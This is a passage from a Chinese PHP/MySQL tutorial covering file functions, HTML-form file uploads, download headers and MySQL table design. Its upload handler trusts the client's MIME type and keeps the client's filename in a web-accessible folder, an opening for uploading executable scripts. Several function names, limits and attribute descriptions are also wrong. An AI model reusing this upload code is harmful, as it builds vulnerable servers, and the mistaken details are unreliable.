fclose($fp);                	//关闭文件资源</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="文件的一些基本操作函数">文件的一些基本操作函数</span></h4><table>
<thead>
<tr>
<th>函数</th>
<th style="text-align:left">语法结构</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>copy()</td>
<td style="text-align:left">copy(来源文件，目的文件)</td>
<td style="text-align:left">复制文件</td>
</tr>
<tr>
<td>unlike()</td>
<td style="text-align:left">unlike(目标文件)</td>
<td style="text-align:left">删除文件</td>
</tr>
<tr>
<td>ftruncate()</td>
<td style="text-align:left">ftruncate(目标文件资源，截取长度)</td>
<td style="text-align:left">将文件截断到指定长度</td>
</tr>
<tr>
<td>rename()</td>
<td style="text-align:left">rename(旧文件名，新文件名)</td>
<td style="text-align:left">重命名文件或目录</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(copy(&apos;./file1.txt&apos;, &apos;../data/file2.txt&apos;)) &#123;              //复制文件示例</span><br><span class="line">		echo &quot;文件复制成功！&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;文件复制失败！&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$filename=&quot;file1.txt&quot;;                           //删除文件示例</span><br><span class="line">	if(file_exists($filename))&#123;</span><br><span class="line">		if(unlink($filename)) &#123;</span><br><span class="line">			echo &quot;文件删除成功！&quot;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;文件删除失败！&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;目标文件不存在&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(rename(&apos;./demo.php&apos;, &apos;./demo.html&apos;)) &#123;           //重命名文件示例</span><br><span class="line">		echo &quot;文件重命名成功！&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;文件重命名失败&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$fp=fopen(&apos;./data.txt&apos;, &quot;r+&quot;) or die(&apos;文件打开失败&apos;);  //截取文件示例</span><br><span class="line">	if(ftruncate($fp, 1024)) &#123;</span><br><span class="line">		echo &quot;文件截取成功！&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;文件截取失败！&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="文件的上传和下载">文件的上传和下载</span></h2><h3><span id="文件上传">文件上传</span></h3><h4><span id="客户端上传设置">客户端上传设置</span></h4><p>文件上传的最基础方法，是使用HTML表单选择本地文件进行提交，在form表单中可以通过<input="file">标记选择本地文件。如果支持文件上传操作，必须在<form>标签中将enctype和method两个属性指明相应的值。</form></input="file"></p>
<ul>
<li>enctype=”munltipart/form-data”用来指定表单编码数据方式，让服务器知道，我们要传递一个文件，并带有常规的表单信息</li>
<li>method=”POST”用来指明发送数据的方法。<br>另外，还需要在form表单中设置一个hidden类型的input框。其中name值为MAX_FILL_SIZE的隐藏值域，并通过设置其VALUE的值限制上传文件的大小（单位字节），但这个值不能超过PHP的配置文件中upload_max_filesize值设置的大小。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;&lt;title&gt;文件上传&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=&quot;upload.php&quot;  method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">			&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000000&quot;&gt;</span><br><span class="line">			选择文件：&lt;input type=&quot;file&quot; name=&quot;myfile&quot;&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="在服务器端通过php处理上传">在服务器端通过PHP处理上传</span></h4><p>客户端的上传表单只能提供本地文件选择，以及提供将文件发送给服务器的标准化方式，但并没有提供相关功能来确定文件到达目的地后发生了什么。所以上传文件的接收和后续处理就要通过PHP脚本来处理。要通过PHP成功地管理文件上传，需要通过以下三方面信息。</p>
<ul>
<li>设置PHP配置文件中的指令：用于精细地调节PHP的文件上传功能</li>
<li>$_FILES多维数组：用于存储各种与上传文件有关的信息。</li>
<li>PHP的文件上传处理函数：用于上传文件的后续处理。</li>
</ul>
<h5><span id="php配置文件中与文件上传有关的选项">PHP配置文件中与文件上传有关的选项</span></h5><table>
<thead>
<tr>
<th>指令名</th>
<th style="text-align:left">默认值</th>
<th>功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_uploads</td>
<td style="text-align:left">ON</td>
<td>确定服务器上的PHP脚本是否可以接受HTTP文件上传</td>
</tr>
<tr>
<td>memory_limit</td>
<td style="text-align:left">8M</td>
<td>设置脚本可以分配的最大内存量，防止失控的脚本独占服务器内存</td>
</tr>
<tr>
<td>upload_max_filesize</td>
<td style="text-align:left">2M</td>
<td>限制PHP处理上传文件大小的最大值，此值必须小于post_max_size值</td>
</tr>
<tr>
<td>post_max_size</td>
<td style="text-align:left">8M</td>
<td>限制通过POST方法可以接受信息的最大值，此值应当大于配置指令upload_max_file的值，因为除了上传的文件之外，还可能传递其他的表单域</td>
</tr>
<tr>
<td>upload_tmp_dir</td>
<td style="text-align:left">NULL</td>
<td>上传文件存放的临时路径，可以是一个绝对路径。这个目录对于拥有此服务器进程用户必须是可写的。上传的文件在处理之前必须成功传输到服务器，所以必须指定一个位置，可以临时放置这些文件，知道文件移到最终目的地为止。例如：upload_tmp_dir=/tmp/.uploads/。默认值为NULL则为操作系统的临时文件夹</td>
</tr>
</tbody>
</table>
<p>表单提交给服务器的数据，可以通过在PHP脚本中使用全局数组 $_GET、 $_POST或 $_REQUEST 接收。而通过POST方法上传的文件有关信息都被存储在多维数组 $_FILES中，这些信息对于通过PHP脚本上传到服务器的文件至关重要。因为文件上传后，首先存储于服务器的临时目录中，同时在PHP脚本中就获取一个$_FILES全局数组。$_FILES数组的第二维中共有五项。</p>
<h5><span id="全局数组_files中的元素说明">全局数组$_FILES中的元素说明</span></h5><table>
<thead>
<tr>
<th>数组</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_FILES[“myfile”][“name”]</td>
<td style="text-align:left">客户端机器文件的原名称，包括扩展名</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“size”]</td>
<td style="text-align:left">已上传文件的大小，单位为字节</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“tmp_name”]</td>
<td style="text-align:left">文件被上传后，在服务器端存储的临时文件名。这是存储在临时目录（由PHP指令upload_tmp_dir指定）中所指定的文件名</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“error”]</td>
<td style="text-align:left">伴随文件上传时产生的错误信息，有五个可能的值。<em>    0：表示没有发生任何错误，文件上传成功</em>    1：表示上传文件的大小超出了在PHP配置文件中指令upload_max_filesize选项限制的值<em>    2：表示上传文件大小超出了HTML表单中MAX_FILE_SIZE选项指定的值</em>    3：表示文件只被上载*    4：标识没有上载任何文件</td>
</tr>
<tr>
<td>$_FILES[“myfile”][“type”]</td>
<td style="text-align:left">获取从客户端上传文件MIME类型，MIME类型规定了各种文件格式的类型，每种MIME类型都是由“/”分隔的主类型和子类型组成，如“image/gif”，主类型为“图像”,子类型为GIF格式的文件，“text/html”代表文本的HTML文件，还有很多其他不同类型的文件。</td>
</tr>
</tbody>
</table>
<ul>
<li>函数is_upload_file()<br>该函数判断指定的文件是否通过HTTP POST上传的，如果是则返回TRUE。用于防止潜在的攻击者对原本不能通过脚本交互的文件进行非法管理，这可以用来确保恶意的用户无法欺骗脚本去访问不能访问的文件，例如/etc/passwd。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bool is_uploaded_file( string filename)			//判断指定的文件是否通过HTTP POST上传的</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>为了能使此函数正常工作，唯一的参数必须指定类似于$_FILES[‘userfile’][‘tmp_name’]的变量，才能判断指定的文件确定是上传文件。如果使用从客户端上传的文件名$_FILES[‘userfile’][‘name’]则不能正常运作。</p>
<ul>
<li>函数move_uploaded_file()<br>文件上传后，首先会存储于服务器的临时目录中，可以使用该函数将上传的文件移动到新位置。此函数的原型如下所示<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bool move_uploaded_file(string filename,string destination)				//将上传的文件移动到新位置</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>虽然函数copy()和函数move()也同样好用，但函数move_uploaded_file()还提供了一种额外的功能，检查并确保由第一个参数filename指定的文件，是否是合法的上传文件。如果文件合法，则将其移到为由第二个参数destination指定的文件。如果filename不是合法的上传文件，不会出现任何操作，将返回FALSE。如果filename是合法的上传文件，但处于某些原因无法移动，不会出现任何操作，也将返回FALSE。此外还会发出一条警告。若成功则返回TRUE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if($_FILES[&apos;myfile&apos;][&apos;error&apos;] &gt; 0) &#123;      //判断文件是否可以成功上传到服务器，0表示上传成功</span><br><span class="line">		echo &apos;上传错误: &apos;;</span><br><span class="line">    		switch ($_FILES[&apos;myfile&apos;][&apos;error&apos;]) &#123;</span><br><span class="line">     			case 1:  </span><br><span class="line">				echo &apos;上传文件大小超出了PHP配置文件中的约定值：upload_max_filesize&apos;;  </span><br><span class="line">				break;</span><br><span class="line">			case 2:  </span><br><span class="line">				echo &apos;上传文件大小超出了表单中的约定值：MAX_FILE_SIZE&apos;;  </span><br><span class="line">				break;</span><br><span class="line">			case 3:  </span><br><span class="line">				echo &apos;文件只被部分上载&apos;; </span><br><span class="line">			       	break;</span><br><span class="line">			case 4:  </span><br><span class="line">				echo &apos;没有上传任何文件&apos;; </span><br><span class="line">			       	break;</span><br><span class="line">   		&#125;</span><br><span class="line">		exit;       //如果$_FILES[&apos;myfile&apos;][&apos;error&apos;]大于0都是有错误，输出错误信息并退出程序</span><br><span class="line">	&#125;</span><br><span class="line">     	//获取上传文件的MIME类型中的主类型和子类型</span><br><span class="line">	list($maintype,$subtype)=explode(&quot;/&quot;,$_FILES[&apos;myfile&apos;][&apos;type&apos;]);	</span><br><span class="line">  	if ($maintype==&quot;text&quot;) &#123;    //通过主类型限制不能上传文本文件，例如.txt .html .php等文件文件</span><br><span class="line">		echo &apos;问题: 不能上传文本文件。&apos;;</span><br><span class="line">		exit;                //如果用户上传文本文件则退出程序</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$upfile = &apos;./uploads/&apos;.time().$_FILES[&apos;myfile&apos;][&apos;name&apos;];     //定义上传后的位置和新文件名</span><br><span class="line">	if (is_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;])) &#123;     //判断是否为上传文件</span><br><span class="line"> 	    	if (!move_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;], $upfile)) &#123;   //从移动文件</span><br><span class="line">        		echo &apos;问题: 不能将文件移动到指定目录。&apos;;</span><br><span class="line">       		exit;</span><br><span class="line">		&#125;</span><br><span class="line"> 	&#125;else&#123;</span><br><span class="line">		echo &apos;问题: 上传文件不是一个合法文件: &apos;;</span><br><span class="line">		echo $_FILES[&apos;myfile&apos;][&apos;name&apos;];</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	echo &apos;文件&apos;.$upfile.&apos;上传成功,大小为&apos;.$_FILES[&apos;myfile&apos;][&apos;size&apos;].&apos;！&lt;br&gt;&apos;;   //如果文件上传成功则输出</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="处理多个文件上传">处理多个文件上传</span></h3><p>多个文件上传和单独文件上传的处理方式是一样的，只需要在客户端多提供几个类型为“file”的输入表单，并指定不同的“name”属性值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;&lt;title&gt;文件上传&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;form action=&quot;mul_upload.php&quot;  method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">			&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000000&quot;&gt;</span><br><span class="line">			选择文件1：&lt;input type=&quot;file&quot; name=&quot;myfile[]&quot;&gt;&lt;br&gt;</span><br><span class="line">			选择文件2：&lt;input type=&quot;file&quot; name=&quot;myfile[]&quot;&gt;&lt;br&gt;</span><br><span class="line">			选择文件3：&lt;input type=&quot;file&quot; name=&quot;myfile[]&quot;&gt;&lt;br&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>在上面的代码中，将三个文件类型的表单以数组的形式组织在一起。当上面的表单提交给PHP的脚本文件mul_upload.php时，在服务器端同时使用全局数组$_FILES存储所有上传文件的信息，但$_FILES由二维数组已经转变为三维数组，这样就可以存储多个上传文件的信息。在脚本文件mul_upload.php中，使用print_r()函数将$_FILES数组中的内容输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	print_r($_FILES);         //打印三维数组$_FILES中的内容，查看一下存储上传文件的结构</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="文件下载">文件下载</span></h3><p>简单的文件下载只需要使用HTML的链接标记a,并将属性href的URL值指定下载的文件即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.example.com/download/example.rar&quot;&gt;下载文件&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
<p>如果通过上面的代码实现文件下载，只能处理一些浏览器不能默认识别的MIME类型文件，例如，当访问example.rar文件时，浏览器并没有直接打开，而是淡出一个下载提示框，提示用户“下载”还是“打开”等处理方式。但如果需要下载后缀名为.html的网页文件、图片文件以及PHP程序脚本文件等，用这种链接形式，则会将文件内容直接输出到浏览器中，并不会提示用户下载。</p>
<p>为了提供文件的安全性，不希望在a标签中给出文件的链接，则必须想浏览器发送必要的头信息，以通知浏览器将要进行下载文件的处理。PHP使用header()函数发送网页的头部信息给浏览器，该函数接受一个头信息的字符串作为参数。文件下载需要发送的头信息包括以下三部分，通过调用三次header()函数完成。以下载图片test.gif为例，需要发送的头信息的代码如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Content-Type:image/gif&apos;);			//发送指定文件MIME类型的头信息</span><br><span class="line">header(&apos;Content-Disposition:attachment;filename=&quot;test.gif&quot;&apos;);			//发送描述文件的头信息，附件和文件名</span><br><span class="line">header(&apos;Content-Length:3390&apos;);			//发送指定文件大小的信息，单位字节</span><br></pre></td></tr></table></figure></p>
<p>如果使用header()函数向浏览器发送了这三行头信息，图片test.gif就不会直接在浏览器中显示，而是让浏览器将该文件形式下载的形式。在函数header()中，“Content-Type”指定了文件的MIME类型，“Content-Disposition”用于文件的描述，值“attachment;filename=”test.gif””说明这是一个附件，并且指定了下载后的文件名，“Content-Length”则给出被下载文件的大小。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$filename=&quot;test.gif&quot;;                                         //指定文件名</span><br><span class="line">	header(&apos;Content-Type: image/gif&apos;);                              //指定下载文件类型</span><br><span class="line">	header(&apos;Content-Disposition: attachment; filename=&quot;&apos;.$filename.&apos;&quot;&apos;);   //指定下载文件的描述</span><br><span class="line">	header(&apos;Content-Length: &apos;.filesize($filename));                     //指定下载文件的大小         </span><br><span class="line">	readfile($filename);       //将文件内容读取出来并直接输出，以便下载</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h1><span id="mysql数据库设计">MySQL数据库设计</span></h1><h2><span id="mysql数据库管理">MySQL数据库管理</span></h2><h3><span id="结构化查询语句sql">结构化查询语句SQL</span></h3><p>SQL语句包含四个部分。</p>
<ul>
<li>数据定义语言（DDL）：用于定义和管理数据对象，包括数据库、数据表等。例如：CREATE、DROP、ALTER等语句</li>
<li>数据操作语言（DML）：用于操作数据库对象中所包含的数据。例如：INSERT、UPDATE、DELETE语句。</li>
<li>数据查询语言（DQL）：用于查询数据库对象 中所包含的数据，能够进行单表查询、连接查询、嵌套查询，以及集合查询等各种复杂程度不同的数据库查询，并将数据返回到客户机中显示。例如：SELECT语句。</li>
<li>数据控制语言（DCL）：是用来管理数据库的语言，包含管理权限及数据更改。例如:GRANT、REVOKE、COMMIT、ROLLBACK等语句。</li>
</ul>
<h3><span id="mysql数据库的连接与关闭">MySQL数据库的连接与关闭</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 服务器主机地址 -u 用户名 -p 用户密码</span><br></pre></td></tr></table></figure>
<ul>
<li>-h：指定所连接的数据库服务器位置，可以是IP地址，也可以是服务器域名</li>
<li>-u：指定连接数据库服务器使用的用户名，例如root为管理员用户具有所有权限</li>
<li>-p：连接数据库服务器使用的密码，但-p和其后的参数之间不要有空格。最后是在该参数后直接回车，然后以密文的形式输入密码<br>如果需要退出客户机，可以任何输入exit或quit命令结束会话</li>
</ul>
<h3><span id="创建-选择及查看数据库">创建、选择及查看数据库</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE [IF NOT EXISTS]bookstore;			#创建一个名为bookstore的数据库</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE [IF EXISTS]bookstore;					#删除一个名为bookstore的数据库</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;							#显示所有已建立的数据库名称列表</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE bookstore;					#打开bookstore数据库为当前数据库使用</span><br></pre></td></tr></table></figure>
<h2><span id="mysql数据库中数据表的设计">MySQL数据库中数据表的设计</span></h2><h3><span id="数据表table">数据表（Table）</span></h3><p>数据表是数据库中基本对象元素，以记录（行）和字段（列）组成的二维结构用于存储数据。数据表由表结构和表内容两部分组成，先建立表结构，然后才能输入数据。数据表结构设计主要包括：字段名称、字段类型和字段属性的设置。</p>
<h3><span id="数据值和列类型">数据值和列类型</span></h3><p>对MySQL中数据值的分类，有数值型、字符型、日期型和空值等，MySQL数据库的表是一个二维表，由一个或多个数据列构成。MySQL中的列类型有三种：数值类、字符串类和日期/时间类。</p>
<h4><span id="数组类的数据列类型">数组类的数据列类型</span></h4><p>MySQL中的数值分整型和浮点型两种。而整型中又分为五种整形数据列类型，即TINYINT,SMALLINT,MEDIUMINT,INT和BIGINT。MySQL也有三种浮点型数据列类型，分别是：FLOAT,BOUBLE和DECIMAL。</p>
<table>
<thead>
<tr>
<th>数据列类型</th>
<th style="text-align:left">存储空间</th>
<th>说明</th>
<th>取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td style="text-align:left">1字节</td>
<td>非常小的整数</td>
<td>带符号值：-128-127   无符号：0-255</td>
</tr>
<tr>
<td>SMALLINT</td>
<td style="text-align:left">2字节</td>
<td>较小的整数</td>
<td>带符号值：-32768-32767   无符号：0-65535</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td style="text-align:left">3字节</td>
<td>中等大小的整数</td>
<td>带符号值：-8388608-8388607   无符号：0-16777215</td>
</tr>
<tr>
<td>INT</td>
<td style="text-align:left">4字节</td>
<td>标准整数</td>
<td>带符号值：-2147483648-2147483647   无符号：0-4294967295</td>
</tr>
<tr>
<td>BIGINT</td>
<td style="text-align:left">8字节</td>
<td>大整数</td>
<td>带符号值：-9223372036854775808-9233372036854775807   无符号：0-18446744073709551615</td>
</tr>
<tr>
<td>FLOAT</td>
<td style="text-align:left">4或8字节</td>
<td>单精度浮点数</td>
<td>最小非零值：+-1.175494351E-38 最大非零值：+-3.402823466E+38</td>
</tr>
<tr>
<td>DOUBLE</td>
<td style="text-align:left">8字节</td>
<td>双精度浮点数</td>
<td>最小非零值：+-2.2250738585072014E-308 最大非零值：+-1.7976931348623157E+308</td>
</tr>
<tr>
<td>DECIMAL</td>
<td style="text-align:left">自定义</td>
<td>以字符串形式表示的浮点数</td>
<td>取决于存储单位字节数</td>
</tr>
</tbody>
</table>
<h4><span id="字符串类数据列类型">字符串类数据列类型</span></h4><table>
<thead>
<tr>
<th>数据列类型</th>
<th style="text-align:left">存储空间</th>
<th>说明</th>
<th>最大长度</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR[(M)]</td>
<td style="text-align:left">M字节</td>
<td>定长字符串</td>
<td>M字节</td>
</tr>
<tr>
<td>VARCHAR[(M)]</td>
<td style="text-align:left">L+1字节</td>
<td>可变字符串</td>
<td>M字节</td>
</tr>
<tr>
<td>TINYBLOD,TINYTEXT</td>
<td style="text-align:left">L+1字节</td>
<td>非常小的BLOB(二进行大对象)和文本串</td>
<td>2e+8-1字节</td>
</tr>
<tr>
<td>BLOB,TEXT</td>
<td style="text-align:left">L+2字节</td>
<td>小BLOB和文本串</td>
<td>2e+16-4字节</td>
</tr>
<tr>
<td>MEDIUMBLOB,MEDIUMTEXT</td>
<td style="text-align:left">L+3字节</td>
<td>中等的BLOB和文本串</td>
<td>2e24-1字节</td>
</tr>
<tr>
<td>LONGBLOB,LONGTEXT</td>
<td style="text-align:left">L+4字节</td>
<td>大BLOB和文本串</td>
<td>2e32-1字节</td>
</tr>
<tr>
<td>ENUM(‘value1’,’value2’,…)</td>
<td style="text-align:left">1或2字节</td>
<td>枚举：可赋予某个枚举成员</td>
<td>65535个成员</td>
</tr>
<tr>
<td>SET(‘value1’,’value2’,…)</td>
<td style="text-align:left">1,2,3,4或8字节</td>
<td>集合：可赋予多个集合成员</td>
<td>64个成员</td>
</tr>
</tbody>
</table>
<p>对于可变长的字符串类型，其长度取决于实际存放在劣种的值的长度。此长度用L来表示。</p>
<h4><span id="日期和时间型数据列类型">日期和时间型数据列类型</span></h4><table>
<thead>
<tr>
<th>数据列类型</th>
<th style="text-align:left">存储空间</th>
<th>说明</th>
<th>最大长度</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE</td>
<td style="text-align:left">3字节</td>
<td>“YYYY-MM-DD”格式表示的日期值</td>
<td>1000-01-01~9999-12-31</td>
</tr>
<tr>
<td>TIME</td>
<td style="text-align:left">3字节</td>
<td>“hh:mm:ss”格式表示的时间值</td>
<td>-838:59:59~838:59:59</td>
</tr>
<tr>
<td>DATETIME</td>
<td style="text-align:left">8字节</td>
<td>“YYYY-MM-DD hh:mm:ss”格式</td>
<td>1000-01-01 00:00:00到9999-12-31 23:59:59</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td style="text-align:left">4字节</td>
<td>“YYYYMMDDhhmmss”格式表示的时间戳</td>
<td>19700101000000~2037年的某个时刻</td>
</tr>
<tr>
<td>YEAR</td>
<td style="text-align:left">1字节</td>
<td>“YYYY”格式的年份量</td>
<td>1901~2155</td>
</tr>
</tbody>
</table>
<h4><span id="null值">NULL值</span></h4><p>NULL意味着”没有值”或”未知值”，MySQL中，0或NULL都意味着假而其他值意味着真。布尔运算的默认真值是1.</p>
<h3><span id="数据字段属性">数据字段属性</span></h3><h4><span id="unsigned">UNSIGNED</span></h4><p>该属性也只能用于设置数值类型，在数值之前自动用0补齐数据列出现负数。</p>
<h4><span id="zerofill">ZEROFILL</span></h4><p>该属性也只能用于设置数值类型，在数值之前自动用0补充不足的位数。</p>
<h4><span id="auto_increment">AUTO_INCREMENT</span></h4><p>该属性用于设置字段的自动增量属性，当数值类型的字段设置为自动增量时，每增加一条新纪录，该字段的值就自动加1，而且此字段的值不允许重复。此修饰符只能修饰整数类型的字段。</p>
<h4><span id="null和not-null">NULL和NOT NULL</span></h4><p>默认为NULL，即插入值时没有在此字段插入值，默认为NULL值，如果指定了NOT NULL，则必须在插入值时在此字段添入值</p>
<h4><span id="default">DEFAULT</span></h4><p>可以通过此属性来指定一个默认值，如果没有在此列添加值，那么默认添加此值。</p>
<h3><span id="创建-修改及删除表">创建、修改及删除表</span></h3><h4><span id="创建表create-table">创建表（CREATE TABLE）</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE [IF NOT EXISTS] 表名称（			#创建带给定名称的表，必须拥有表CREATE权限</span><br><span class="line">	字段名1 列类型 [属性][索引],			#声明表中第一个字段，必须有字段名和列类型</span><br><span class="line">	字段名2 列类型 [属性][索引],			</span><br><span class="line">	...,</span><br><span class="line">	字段名n 列类型 [属性][索引],			#每个字段的属性和索引都是可选的，根据需要设置</span><br><span class="line">）[表类型][表字符集];							#在创建表时也可指定可选的表类型和字符集的设置</span><br></pre></td></tr></table></figure>
<p>其中[]中的为可选的内容，一个表可以由一个或多个字段（列）组成，在字段名后面一定要注明该字段的数据类型。每个字段也可以使用属性对其进行限制说明，但属性是可选的，根据表的需要进行声明。</p>
<h4><span id="修改表alter-table">修改表（ALTER TABLE）</span></h4><p>可以用ALTER TABLE语句来修改表的结构，包括添加新的字段、删除原有的字段、修改列的类型、属性及索引，甚至可以修改表的名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ACTION；				#修改表的语法格式</span><br></pre></td></tr></table></figure></p>
<p>其中ACTION是ALTER TABLE的从句，包括为指定的表添加一新列、为表添加一个索引、更改指定列默认值、更改列类型、删除一列、删除索引、更改表名等语句。</p>
<ul>
<li>为指定的数据表添加一新字段，可以在ACTION从句中使用ADD关键字实现<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 字段名 &lt;建表语句&gt;[FIRST|AFTER 列名]		#为指定的表添加新列</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>如果没指定可选的FIRST或AFTER，则在列尾添加一列，否则在指定列添加新列。</p>
<ul>
